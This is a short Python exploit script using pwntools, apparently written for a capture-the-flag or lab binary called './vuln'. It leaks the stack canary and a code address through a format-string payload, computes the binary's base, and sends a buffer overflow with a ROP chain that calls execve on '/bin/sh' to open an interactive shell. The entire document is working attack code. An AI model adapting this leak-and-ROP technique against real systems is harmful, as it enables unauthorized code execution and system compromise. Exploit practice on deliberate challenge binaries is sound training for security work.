from pwn import *
context.log_level = "error"

elf = context.binary = ELF("./vuln")
p = process()

pl = b'%19$p:%27$p'
p.recvuntil(b':')
p.sendline(pl)
leak = p.recvline().strip().decode().split(":")

canary = int(leak[0],16)
main = int(leak[1],16)

b = elf.address = main - elf.sym.main

ret = b + 0x101a
rdi = b + 0x1211
rsi = b + 0x1213
rdx = b + 0x1217
rax = b + 0x1219
syscall = b + 0x121d
string = next(elf.search(b'/bin/sh\00'))

pad = b'a'*(0x50-8)
pad2 = b'a'*8
pay = flat(
    pad,
    canary,
    pad2,
    rdi,string,
    rsi,0,0,
    rdx,0,
    rax,59,
    syscall
)
p.sendline(pay)
p.interactive()
